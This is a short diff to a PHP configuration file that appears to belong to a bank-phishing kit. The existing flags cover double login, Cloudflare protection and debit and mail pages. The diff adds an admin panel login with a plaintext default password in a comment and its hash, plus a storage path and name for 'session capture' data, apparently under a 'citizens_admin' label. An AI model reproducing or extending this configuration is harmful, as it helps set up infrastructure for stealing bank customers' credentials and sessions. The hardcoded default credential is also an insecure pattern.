@@ -12,4 +12,13 @@ $doublelogin =  "off";
 $CFProtection = "on";
 $debitpage = "off";
 $mailpage = "off";
+
+// admin panel credentials
+$adminUser = 'admin';
+// password: ChangeMe123!
+$adminPassHash = '$2y$12$GIrxvYXfb75QHFVCwEfxyO6iQmfrg2cYKfChpvWE9IoIj1TJBHGf.';
+
+// session capture storage configuration
+$sessionStoragePath = __DIR__ . '/storage/session_data.json';
+$adminSessionName = 'citizens_admin';
 ?>
